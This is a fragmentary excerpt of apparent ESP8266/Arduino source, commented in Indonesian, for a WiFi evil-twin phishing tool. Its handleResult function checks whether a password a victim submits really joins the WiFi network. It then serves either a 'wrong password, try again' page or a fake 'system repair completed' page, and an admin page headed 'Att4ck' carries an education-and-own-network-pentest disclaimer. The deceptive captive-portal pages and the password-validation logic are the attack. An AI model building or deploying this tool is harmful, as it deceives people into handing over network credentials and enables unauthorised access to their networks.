...
void setup() {
  ...
  /* OLED Conf 
  Apabila OLED tidak merespon:
  Silahkan sesuaikan address (0x3c) terlebih dahulu dengan i2c scanner (cek di github.com/shinyxn).
  */
...
void handleResult() {
  ...
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Password yang anda masukkan salah</h2><p>Silahkan mencoba kembali...</p></body> </html>");
    ...
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Perbaikan sistem telah selesai!</h2></body> </html>");
    ...
    <body>
        ...
        <p>
            ...
            <span>
                ...
                - Gunakan tools ini dengan bijak dan bertanggung jawab<br>
                - Segala akibat dari penggunaan tools ini merupakan tanggung jawab pemakai<br>
                - Tools ini hanya sebagai edukasi/pembelajaran dan diperuntukkan untuk pentesting jaringan milik pribadi<br>
                </span>
        </p><hr><br>
        <h1>Att4ck</h1>
